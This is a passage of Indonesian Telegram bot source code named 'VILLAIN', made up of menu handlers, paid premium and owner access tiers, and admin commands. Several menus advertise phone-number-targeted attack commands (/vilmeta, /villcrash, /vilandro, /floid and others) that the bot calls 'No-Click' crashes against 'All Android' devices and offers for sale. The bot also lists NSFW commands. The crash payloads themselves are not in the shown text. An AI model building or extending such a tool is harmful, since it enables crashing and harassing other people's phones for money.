© 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
// Action untuk OwnerMenu
bot.action('fitur', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);

  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

┏━━━━⧼⧼ 𝙁 𝙄 𝙏 𝙐 𝙍 𝙈 𝙀 𝙉 𝙐 ⧽⧽━━━
┃  ╭────────────────────
┃  │ 𖠂 /enc ( enc script hard js ) 
┃  │ 𖠂 /refresh ( Cek Sender ) 
┃  │ 𖠂 /disablemodes 
┃  │ 𖠂 /grouponly 
┃  ╰────────────────────
┗━━━━━━━━━━━━━━━━━━
© 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('option3', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu', 'option1')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

रु ⌜ ☠️𝙑𝙞𝙡𝙗𝙚𝙩𝙖 ☠️ ⌟
╎रु: /vilbeta 62xxx
╰╌╌╌╌╌╌╌╌╌╌╌╌╌⌯
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('play', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

┏━━━❰ 𝙋𝙡𝙖𝙮 ❱━━━
┃ /play
┗━━━━━━━━━━━━━━━
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('Deploy', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

━━━━━━━━━━━━━━━━━━━━━
🄿🅁🄸🄲🄴 - 🄳🄴🄿🄻🄾🅈 
━━━━━━━━━━━━━━━━━━━━━
𝙍𝙥 20.000 ( 𝘯𝘰 𝘧𝘳𝘦𝘦 𝘶𝘱𝘥𝘢𝘵𝘦 )
𝙍𝙥 30.000 ( 𝘧𝘳𝘦𝘦 𝘶𝘱𝘥𝘢𝘵𝘦 𝘷 2 ) 
━━━━━━━━━━━━━━━━━━━━━
𝗡𝗼𝘁𝗲 :
𝚃𝚒𝚍𝚊𝚔 𝙼𝚎𝚗𝚓𝚞𝚊𝚕 𝚂𝚌𝚛𝚒𝚙𝚝 𝚅𝚒𝚕𝚕𝚊𝚒𝚗
𝙹𝚒𝚔𝚊 𝙼𝚊𝚞 𝙳𝚎𝚙𝚕𝚘𝚢 𝙱𝚒𝚜𝚊 𝙺𝚎 𝙿𝚟 
𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 @Zyrexoffc
━━━━━━━━━━━━━━━━━━━━━
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('Akses', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

━━━━━━━━━━━━━━━━━━━━━
🄿🅁🄸🄲🄴 - 🄰🄺🅂🄴🅂 
━━━━━━━━━━━━━━━━━━━━━
1. 𝘼𝙆𝙎𝙀𝙎 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 : 10K
2. 𝘼𝙆𝙎𝙀𝙎 𝘼𝘿𝙈𝙄𝙉 : 20K
3. 𝘼𝙆𝙎𝙀𝙎 𝙊𝙒𝙉𝙀𝙍 : 35K
━━━━━━━━━━━━━━━━━━━━━
𝗡𝗼𝘁𝗲 :
𝙹𝚒𝚔𝚊 𝙼𝚊𝚞 𝙱𝚞𝚢 𝙰𝚔𝚜𝚎𝚜 
𝙱𝚒𝚜𝚊 𝚕𝚊𝚗𝚐𝚜𝚞𝚗𝚐 𝙲𝚑𝚊𝚝 𝙳𝚎𝚟 𝚗𝚢𝚊
@Zyrexoffc
━━━━━━━━━━━━━━━━━━━━━
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('Meta', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu2', 'Bugmenu2')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

╭═══════『 𝙑𝙄𝙇𝙈𝙀𝙏𝘼  』═══════⊱
│𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /vilmeta 628xxx
│   ├ Tipe: No-Click
│   ├ Target: All Android
│   ├ Impact: 97% Brutal
│   └ Status: Ganas 🔥
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support Nomor indo / luar negeri
│ Tidak Boleh Ada + dan -
│ • Max hit: 2x
│
╰═════════════════════⊱
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('glich', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu2', 'Bugmenu2')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

╭═══════『 𝙑𝙄𝙇𝙂𝙇𝙄𝘾𝙃 』═══════⊱
│𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /vilglich 628xxx
│   ├ Tipe: No-Click
│   ├ Target: All Android
│   ├ Impact: 97% Brutal
│   └ Status: Ganas 🔥
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support Nomor indo / luar negeri
│ Tidak Boleh Ada + dan -
│ • Max hit: 2x
│
╰═════════════════════⊱
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('crash', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu2', 'Bugmenu2')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

╭═══════『 𝙑𝙄𝙇𝘾𝙍𝘼𝙎𝙃 』═══════⊱
│𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /villcrash 628xxx
│   ├ Tipe: No-Click
│   ├ Target: All Android
│   ├ Impact: 97% Brutal
│   └ Status: Ganas 🔥
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support Nomor indo / luar negeri
│ Tidak Boleh Ada + dan -
│ • Max hit: 2x
│
╰═════════════════════⊱
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('option4', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu', 'option1')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

╭═══════『 𝙑𝙄𝙇𝘼𝙉𝘿𝙍𝙊 』═══════⊱
│𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /vilandro 628xxx
│   ├ Tipe: No-Click
│   ├ Target: All Android
│   ├ Impact: 97% Brutal
│   └ Status: Ganas 🔥
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support Nomor indo / luar negeri
│ Tidak Boleh Ada + dan -
│ • Max hit: 2x
│
╰═════════════════════⊱
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('option5', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu', 'option1')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

╭═══════『 𝙑𝙄𝙇𝙐𝙄 』═══════⊱
│𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /vilui 628xxx
│   ├ Tipe: No-Click
│   ├ Target: All Android
│   ├ Impact: 97% Brutal
│   └ Status: Ganas 🔥
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support Nomor indo / luar negeri
│ Tidak Boleh Ada + dan -
│ • Max hit: 2x
│
╰═════════════════════⊱
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('option6', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu', 'option1')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

╭═══════『 𝙑𝙄𝙇𝙐𝙇𝙏𝙍𝘼 』═══════⊱
│𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /vilglich 628xxx
│   ├ Tipe: No-Click
│   ├ Target: All Android
│   ├ Impact: 97% Brutal
│   └ Status: Ganas 🔥
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support Nomor indo / luar negeri
│ Tidak Boleh Ada + dan -
│ • Max hit: 2x
│
╰═════════════════════⊱
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('option7', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu', 'option1')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

रु ⌜ ☠️𝙑𝙞𝙡𝙗𝙡𝙖𝙣𝙠 ☠️ ⌟
╎रु: /vilblank 62xxx
╰╌╌╌╌╌╌╌╌╌╌╌╌╌⌯
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
// Action untuk Vilbeta
bot.action('option8', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Bugmenu', 'option1')],
  ]);
  const caption = `${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'}

╭═══════『 𝙁𝙇𝙊𝙄𝘿 』═══════⊱
│𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /floid 628xxx
│   ├ Tipe: No-Click
│   ├ Target: All Android
│   ├ Impact: 97% Brutal
│   └ Status: Ganas 🔥
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support Nomor indo / luar negeri
│ Tidak Boleh Ada + dan -
│ • Max hit: 2x
│
╰═════════════════════⊱
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 `;
 
  await editMenu(ctx, caption, buttons);
});
bot.command('randommenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
    [Markup.button.callback('➡️ Next', 'downloadmenu')], // Tombol baru "Next"
  ]);

  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'} I am a 𝙑𝙄𝙇𝙇𝘼𝙄𝙉 bot created  @reynzban,I'm here to assist you with anything you might need, making your interaction smoother and more efficient.
❒━━━━━‐━━━━━‐━━━━━━━〆
━━━━━━━━━━━━━━━━━━━━━
╭──( 🔎    \`ꜱᴇᴀʀᴄʜᴍᴇɴᴜ\`    🔎 )
│→ /youtubesearch
│→ /xvideosearch
│→ /tiktoksearch
│→ /spotify
│→ /googleimage
│→ /pinterest
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 
    `;

  await editMenu(ctx, caption, buttons);
});
bot.action('downloadmenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('➡️ Next', 'aimenu')], // Tombol baru "Next"
  ]);

  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'} I am a 𝙑𝙄𝙇𝙇𝘼𝙄𝙉 bot created  @reynzban,I'm here to assist you with anything you might need, making your interaction smoother and more efficient.
❒━━━━━‐━━━━━‐━━━━━━━〆
╭──( 📩   \`ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ\`    📩 )
│→ /ytmp3 ( Link Url )
│→ /ytmp4 ( Link Url )
│→ /tiktokmp3 ( Link Url )
│→ /Spotifymp3 ( Link Url )
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action('aimenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`${greeting} Aloo `));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back', 'downloadmenu')],
  ]);

  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'} I am a 𝙑𝙄𝙇𝙇𝘼𝙄𝙉 bot created  @reynzban,I'm here to assist you with anything you might need, making your interaction smoother and more efficient.
❒━━━━━‐━━━━━‐━━━━━━━〆
╭──( 🤖    \`ᴀɪᴍᴇɴᴜ\`    🤖 )
│→ /simi ( massage )
│→ /gpt4 ( massage )
│→ /xcimage ( query )
│→ /xcimage2 ( query )
│→ /gemini ( massage )
│→ /brat ( sticker )
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
 
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action('javamenu', async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back', 'aimenu')],
    [Markup.button.callback('❌ Batas Jir Pulang', 'startmenu')], // Tombol baru "Next"
  ]);

  const caption = `
${greeting}☁️
𝙃𝙚𝙡𝙡𝙤 ${ctx.from.first_name || 'User'} I am a 𝙑𝙄𝙇𝙇𝘼𝙄𝙉 bot created  @reynzban,I'm here to assist you with anything you might need, making your interaction smoother and more efficient.
❒━━━━━‐━━━━━‐━━━━━━━〆
╭──( 🥵    \`ɴꜱꜰᴡᴍᴇɴᴜ\`   🥵 )
│→ /hentaivid
│→ /pussy
│→ /yuri
│→ /r34
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
 © 𝙑𝙄𝙇𝙇𝘼𝙄𝙉
  `;

  await editMenu(ctx, caption, buttons);
});
// Action untuk About
bot.action('about', async (ctx) => {
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);

  const caption = `
${greeting}☁️
Hello ${ctx.from.first_name || 'User'} 

┏━━━❰ 𝘼𝙗𝙤𝙪𝙩 ❱━━━━━━━━━━━━━━━❍
┃𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧 𝙑𝙄𝙇𝙇𝘼𝙄𝙉 : @Zyrexoffc
┗━━━━━━━━━━━━━━━━━━━━━━━━❍
© 𝐕𝐈𝐋𝐋𝐀𝐈𝐍
  `;

  await editMenu(ctx, caption, buttons);
});
const o = fs.readFileSync(`./o.jpg`)
// URL raw GitHub file
const USERS_PREMIUM_FILE = 'usersPremium.json';
// Inisialisasi file usersPremium.json
let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
    usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status premium
function isPremium(userId) {
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

// Fungsi untuk menambahkan user ke premium
function addPremium(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersPremium[userId] = { premiumUntil: expireTime };
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}
bot.command('statusprem', (ctx) => {
    const userId = ctx.from.id;

    if (isPremium(userId)) {
        const expireDate = new Date(usersPremium[userId].premiumUntil);
        return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have premium access.');
    }
});
// Command untuk melihat daftar user premium
  bot.command('listprem', async (ctx) => {
    const premiumUsers = Object.entries(usersPremium)
        .filter(([userId, data]) => data.premiumUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.premiumUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (premiumUsers.length > 0) {
        // Membuat konstanta untuk menampilkan ID, username, dan waktu kedaluwarsa pengguna
        const userDetails = await Promise.all(
            premiumUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 \n\n${userDetails.join('\n\n')}`;
        const VideoUrl = 'https://files.catbox.moe/shgz6w.mp4'; // Ganti dengan URL gambar

        const keyboard = [
            [
                {
                    text: "ぢ",
                    callback_data: "/menu"
                },
                {
                    text: "☁️ Support Owner",
                    url: "https://reynzjirr"
                }
            ]
        ];

        // Mengirim gambar dengan caption dan inline keyboard
        return ctx.replyWithVideo(getRandomVideo(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have premium access.');
    }
});  
    // Command untuk menambahkan pengguna premium (hanya bisa dilakukan oleh owner)
bot.command('addprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    const userId = ctx.from.id;
    
    // Cek apakah pengguna adalah owner atau memiliki akses caywzzaja
    if (ownerId !== OWNER_ID && !isCaywzzaja(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply(`
┏━━━❰  𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Format tidak valid!
┣⟣ Contoh: /addprem <user_id> <Durasi>
┣⟣ Durasi: 
┃  • 30d (30 hari)
┃  • 24h (24 jam)
┃  • 1m (1 bulan)
┗━━━━━━━━━━━━━━━`);
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addPremium(targetUserId, duration);
    ctx.reply(`
┏━━━❰ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 ❱━━━
┣⟣ User ID: ${targetUserId}
┣⟣ Durasi: ${duration}
┣⟣ Status: Berhasil ✅
├━━━『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』━━━
┃ • Akses ke semua fitur premium
┃ • Priority support
┃ • Unlimited penggunaan
┗━━━━━━━━━━━━━━━
    `);
});
bot.command('delprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deleteprem <user_id>');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus premium user, implementasi tergantung logika sistem Anda
    const wasDeleted = removePremium(targetUserId); // Pastikan Anda memiliki fungsi ini

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
    }
}); 
// Command untuk menghapus file tertentu
bot.command('delfile', async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username;

if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }
  

  // Tentukan file yang ingin dihapus
  const fileName = 'session/creds.json'; // Ganti dengan nama file yang ingin Anda hapus
  const filePath = path.resolve(__dirname, fileName);

  // Periksa apakah file ada
  if (!fs.existsSync(filePath)) {
    return ctx.reply(`⚠️ File "${fileName}" tidak ditemukan.`);
  }

  // Hapus file
  try {
    fs.unlinkSync(filePath);
    ctx.reply(`✅ File "${fileName}" berhasil dihapus.`);
  } catch (error) {
    console.error(error);
    ctx.reply(`❌ Gagal menghapus file "${fileName}".`);
  }
});
bot.command("restart", async (ctx) => {
  // Periksa apakah pengguna adalah Developer
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  try {
    await ctx.reply("🔄 Bot akan restart dalam beberapa detik...");
    setTimeout(() => {
      process.exit(0); // Menghentikan proses untuk restart
    }, 3000);
  } catch {
    ctx.reply("❌ Terjadi kesalahan saat mencoba restart bot.");
  }
});
// Contoh fungsi `removePremium`, implementasikan sesuai database atau logika Anda
function removePremium(userId) {
    // Implementasi tergantung sistem, return true jika berhasil
    // Contoh:
    // const result = database.deletePremium(userId);
    // return result.success;
    console.log(`Removing premium access for user: ${userId}`);
    return true; // Ubah sesuai hasil operasi
}
bot.command('premiumfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    // Logika untuk pengguna premium
    ctx.reply('🎉 Welcome to the premium-only feature! Enjoy exclusive benefits.');
});
const USERS_CAYWZZAJA_FILE = 'usersCaywzzaja.json';
// Inisialisasi file usersCaywzzaja.json
let usersCaywzzaja = {};
if (fs.existsSync(USERS_CAYWZZAJA_FILE)) {
    usersCaywzzaja = JSON.parse(fs.readFileSync(USERS_CAYWZZAJA_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_CAYWZZAJA_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status caywzzaja
function isCaywzzaja(userId) {
    return usersCaywzzaja[userId] && usersCaywzzaja[userId].caywzzajaUntil > Date.now();
}

// Fungsi untuk menambahkan user ke caywzzaja
function addCaywzzaja(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersCaywzzaja[userId] = { caywzzajaUntil: expireTime };
    fs.writeFileSync(USERS_CAYWZZAJA_FILE, JSON.stringify(usersCaywzzaja, null, 2));
}

// Command untuk mengecek status caywzzaja
bot.command('statusowner', (ctx) => {
    const userId = ctx.from.id;

    if (isCaywzzaja(userId)) {
        const expireDate = new Date(usersCaywzzaja[userId].caywzzajaUntil);
        return ctx.reply(`✅ You have Owner access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have Owner Acess.');
    }
});

// Command untuk melihat daftar user dengan status caywzzaja
bot.command('listowner', async (ctx) => {
    const caywzzajaUsers = Object.entries(usersCaywzzaja)
        .filter(([userId, data]) => data.caywzzajaUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.caywzzajaUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (caywzzajaUsers.length > 0) {
        // Membuat konstanta untuk menampilkan ID, username, dan waktu kedaluwarsa pengguna
        const userDetails = await Promise.all(
            caywzzajaUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙊𝙬𝙣𝙚𝙧𝙨 \n\n${userDetails.join('\n\n')}`;
        const VideoUrl = 'https://files.catbox.moe/shgz6w.mp4'; // Ganti dengan URL gambar

        const keyboard = [
            [
                {
                    text: "ぢ",
                    callback_data: "/menu"
                },
                {
                    text: "☁️ Support Owner",
                    url: "https://Zyrexoffc"
                }
            ]
        ];

        // Mengirim gambar dengan caption dan inline keyboard
        return ctx.replyWithVideo(getRandomVideo(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have Owner access.');
    }
});
bot.command('info', async (ctx) => {
  const mention = ctx.message.text.split(' ')[1]; // Mendapatkan username setelah perintah /info
  let user;
  
  if (mention) {
    // Jika ada username, ambil informasi pengguna berdasarkan username
    try {
      user = await ctx.telegram.getChat(mention);
      const userLink = `https://t.me/${mention}`; // Link pengguna
      ctx.reply(`
┏━━━━⧼⧼ 𝙐 𝙎 𝙀 𝙍 𝙄 𝙉 𝙁 𝙊⧽⧽━━━
┃  ╭────────────────────
┃  │ 𖠂 𝙄𝘿 : ${user.id}
┃  │ 𖠂 𝙁𝙄𝙍𝙎𝙏 𝙉𝘼𝙈𝙀 : ${userInfo.first_name || 'Tidak ada nama depan'}
┃  │ 𖠂 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : @${mention}
┃  │ 𖠂 𝙐𝙎𝙀𝙍𝙇𝙄𝙉𝙆 : ${userLink}
┃  ╰────────────────────
┗━━━━━━━━━━━━━━━━━━
`);
    } catch (error) {
      ctx.reply('⛅ Format Salah! Lakukan Lah Seperti Ini /info');
    }
  } else {
    // Jika tidak ada username, tampilkan info pengguna yang mengirim perintah
    const userInfo = ctx.from;
    const userLink = `https://t.me/${userInfo.username || userInfo.id}`;
    ctx.reply(`
┏━━━━⧼⧼ 𝙐 𝙎 𝙀 𝙍 𝙄 𝙉 𝙁 𝙊⧽⧽━━━
┃  ╭────────────────────
┃  │ 𖠂 𝙄𝘿 : ${userInfo.id}
